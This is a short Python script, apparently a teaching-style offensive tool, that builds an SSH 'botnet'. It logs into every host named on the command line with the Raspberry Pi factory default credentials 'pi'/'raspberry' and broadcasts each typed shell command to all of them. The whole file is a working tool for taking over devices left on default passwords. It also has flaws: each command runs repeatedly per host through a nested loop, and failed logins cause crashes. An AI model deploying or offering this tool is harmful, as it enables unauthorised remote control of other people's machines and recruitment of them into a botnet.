from pexpect import pxssh
import sys

class Client:

    #Function definitions
    #-------------------------------------------------------

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print (e)
            print ('[-]Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    def botnetCommand(self, command):
        for client in botNet:
            output = client.send_command(command)
            print ('[*]Output from ' + client.host)
            print ('[+]' + output.decode('utf-8'))

#Code
#-----------------------------------------------
botNet = []

def addClient(host, user, password):
        client = Client(host, user, password)
        botNet.append(client)

print("Adding clients...")
for i in range(1, len(sys.argv)):
	print("\tClient: {} ".format(sys.argv[i]))
	addClient(sys.argv[i], 'pi', 'raspberry')
print("Number of clients connected: {}".format(len(botNet)))

cmd = ""
try:
	while True:
		cmd = input("$ ")
		
		for x in botNet:
		    x.botnetCommand(cmd)
except KeyboardInterrupt:
	print(" CTRL+C, exiting...")
